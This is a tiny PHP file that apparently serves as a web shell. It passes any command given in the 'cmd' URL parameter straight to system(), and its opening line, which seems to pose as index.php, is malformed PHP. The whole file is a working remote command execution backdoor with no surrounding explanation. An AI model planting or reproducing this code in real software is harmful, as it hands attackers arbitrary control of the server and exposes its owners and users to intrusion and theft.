<?php
    echo (index.php);
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>